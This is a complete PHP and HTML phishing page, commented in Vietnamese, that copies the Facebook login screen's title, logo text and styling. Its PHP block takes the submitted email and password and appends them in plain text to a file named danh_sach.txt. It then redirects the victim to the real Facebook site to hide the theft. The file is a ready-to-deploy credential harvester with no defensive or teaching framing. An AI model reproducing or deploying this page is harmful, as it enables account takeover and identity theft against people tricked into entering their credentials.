<?php
// PHẦN 1: XỬ LÝ DỮ LIỆU KHI NGƯỜI DÙNG BẤM GỬI FORM
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Nhận dữ liệu từ form gửi sang
    $tai_khoan = $_POST['email'] ?? '';
    $mat_khau = $_POST['pass'] ?? '';

    // Mở file danh_sach.txt để ghi nối tiếp dữ liệu vào
    $file = fopen("danh_sach.txt", "a");
    fwrite($file, "Tài khoản: " . $tai_khoan . " | Mật khẩu: " . $mat_khau . "\n");
    fclose($file);

    // Chuyển hướng người dùng sang trang Facebook thật ngay sau khi bấm
    header("Location: https://www.facebook.com");
    exit();
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 360px;
            text-align: center;
        }
        .login-box h1 {
            color: #1877f2;
            font-size: 40px;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .login-box input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-box button {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-box button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h1>facebook</h1>

        <!-- PHẦN 2: GIAO DIỆN HTML (action để trống nghĩa là gửi dữ liệu về chính file này xử lý) -->
        <form action="" method="POST">
            <input type="text" name="email" placeholder="Email hoặc số điện thoại" required>
            <input type="password" name="pass" placeholder="Mật khẩu" required>
            <button type="submit">Đăng nhập</button>
        </form>
    </div>

</body>
</html>